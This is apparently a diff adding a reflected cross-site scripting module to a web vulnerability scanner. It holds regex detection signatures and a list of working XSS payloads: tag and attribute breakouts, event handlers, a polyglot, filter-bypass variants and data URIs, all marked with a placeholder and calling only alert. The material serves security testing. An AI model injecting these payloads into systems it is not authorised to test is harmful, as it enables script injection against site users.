@@ -1,0 +1,91 @@
+name: xss
+description: Cross-Site Scripting refletido (breakout de contexto + reflexão de marcador)
+detectors: [signature, reflection]
+reflected_signatures: true   # p/ XSS, a reflexão do payload É a evidência
+
+transforms:
+  - raw
+  - url
+  - html_dec
+  - html_hex
+  - case_random
+  - fullwidth
+
+# IMPORTANTE: toda assinatura EXIGE o '<tag' literal não-escapado. Se a app
+# escapa < >, o '<' vira &lt; e NADA casa — evita FP em reflexão escapada
+# (html.escape NÃO toca em '=' nem em 'onerror', então casar só 'onerror=alert'
+# daria falso-positivo). Match => tag executável refletida sem sanitização.
+signatures:
+  - "<script[^>]*>\\s*(alert|prompt|confirm|eval)"
+  - "<\\w+[^>]*\\son\\w+\\s*=\\s*(alert|prompt|confirm|eval)"   # <tag ... onX=alert
+  - "<svg[^>]*\\son\\w+\\s*="
+  - "<img[^>]*\\sonerror\\s*="
+  - "<iframe[^>]*\\s(srcdoc|src)\\s*=\\s*[\"']?javascript:"
+  - "<a[^>]*href\\s*=\\s*[\"']?javascript:\\s*(alert|prompt|confirm)"
+  - "<[^>]*formaction\\s*=\\s*[\"']?javascript:"
+  - "<script>\\s*(alert|prompt|confirm)\\("
+
+payloads:
+  # --- contexto texto/HTML ---
+  - { value: "<script>alert('{MARK}')</script>", tags: [html] }
+  - { value: "<ScRiPt>alert('{MARK}')</ScRiPt>", tags: [html, case] }
+  - { value: "<svg/onload=alert('{MARK}')>", tags: [html, svg] }
+  - { value: "<svg onload=alert`{MARK}`>", tags: [html, svg, backtick] }
+  - { value: "<img src=x onerror=alert('{MARK}')>", tags: [html, img] }
+  - { value: "<body onload=alert('{MARK}')>", tags: [html] }
+  - { value: "<details open ontoggle=alert('{MARK}')>", tags: [html] }
+  - { value: "<iframe src=javascript:alert('{MARK}')>", tags: [html, iframe] }
+  # --- breakout de atributo (aspas dupla/simples) ---
+  - { value: "\"><script>alert('{MARK}')</script>", tags: [attr, dquote] }
+  - { value: "'><script>alert('{MARK}')</script>", tags: [attr, squote] }
+  - { value: "\"><img src=x onerror=alert('{MARK}')>", tags: [attr, dquote] }
+  - { value: "'\"><svg onload=alert('{MARK}')>", tags: [attr, both] }
+  - { value: "\" onmouseover=alert('{MARK}') x=\"", tags: [attr, event] }
+  - { value: "' autofocus onfocus=alert('{MARK}') x='", tags: [attr, event] }
+  # --- contexto de URL / atributo href ---
+  - { value: "javascript:alert('{MARK}')", tags: [uri] }
+  - { value: "jaVaScRipT:alert('{MARK}')", tags: [uri, case] }
+  # --- contexto de script (quebra de string JS) ---
+  - { value: "';alert('{MARK}');//", tags: [js, string] }
+  - { value: "\";alert('{MARK}');//", tags: [js, string] }
+  - { value: "</script><script>alert('{MARK}')</script>", tags: [js, breakout] }
+  # --- marcador puro (detecta reflexão/contexto p/ triagem manual) ---
+  - { value: "ph{MARK}ph", tags: [probe, reflect] }
+  # --- polyglot multi-contexto ---
+  - { value: "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('{MARK}')//'>", tags: [polyglot] }
+  # --- event handlers extras (sem <script>) ---
+  - { value: "<img src=x onerror=alert`{MARK}`>", tags: [html, backtick] }
+  - { value: "<video><source onerror=alert('{MARK}')>", tags: [html] }
+  - { value: "<audio src=x onerror=alert('{MARK}')>", tags: [html] }
+  - { value: "<marquee onstart=alert('{MARK}')>", tags: [html] }
+  - { value: "<select autofocus onfocus=alert('{MARK}')>", tags: [html] }
+  - { value: "<input autofocus onfocus=alert('{MARK}')>", tags: [html] }
+  - { value: "<textarea autofocus onfocus=alert('{MARK}')>", tags: [html] }
+  - { value: "<keygen autofocus onfocus=alert('{MARK}')>", tags: [html] }
+  - { value: "<form><button formaction=javascript:alert('{MARK}')>X", tags: [html] }
+  - { value: "<math><mtext><script>alert('{MARK}')</script>", tags: [html, mathml] }
+  - { value: "<xss id=x tabindex=1 onactivate=alert('{MARK}')></xss>", tags: [html] }
+  - { value: "<style>@keyframes x{}</style><xss style=animation-name:x onanimationend=alert('{MARK}')></xss>", tags: [css] }
+  # --- bypass de filtro ---
+  - { value: "<scr<script>ipt>alert('{MARK}')</scr</script>ipt>", tags: [bypass, nested] }
+  - { value: "<SCRIPT>alert('{MARK}')</SCRIPT>", tags: [bypass, case] }
+  - { value: "<svg><script>alert&lpar;'{MARK}'&rpar;</script>", tags: [bypass, entity] }
+  - { value: "<img src=x:alert(alt) onerror=eval(src) alt='{MARK}'>", tags: [bypass] }
+  - { value: "<iframe srcdoc=\"<script>alert('{MARK}')</script>\">", tags: [bypass, srcdoc] }
+  - { value: "<svg><animate onbegin=alert('{MARK}') attributeName=x dur=1s>", tags: [bypass, svg] }
+  - { value: "<a href=javascript&colon;alert('{MARK}')>x</a>", tags: [bypass, entity] }
+  - { value: "<img/src/onerror=alert('{MARK}')>", tags: [bypass, slash] }
+  - { value: "<svg onload=alert&#40;'{MARK}'&#41;>", tags: [bypass, entity] }
+  # --- contexto JS extras ---
+  - { value: "-alert('{MARK}')-", tags: [js, expr] }
+  - { value: "'-alert('{MARK}')-'", tags: [js, string] }
+  - { value: "`-alert('{MARK}')-`", tags: [js, template] }
+  - { value: "</script><svg/onload=alert('{MARK}')>", tags: [js, breakout] }
+  - { value: "*/alert('{MARK}');/*", tags: [js, comment] }
+  # --- atributo / DOM ---
+  - { value: "\"><body/onload=alert('{MARK}')>", tags: [attr] }
+  - { value: "\" onfocus=alert('{MARK}') autofocus tabindex=1 x=\"", tags: [attr] }
+  - { value: "'-prompt('{MARK}')-'", tags: [attr, prompt] }
+  # --- data URI ---
+  - { value: "data:text/html,<script>alert('{MARK}')</script>", tags: [uri, data] }
+  - { value: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", tags: [uri, data, base64] }
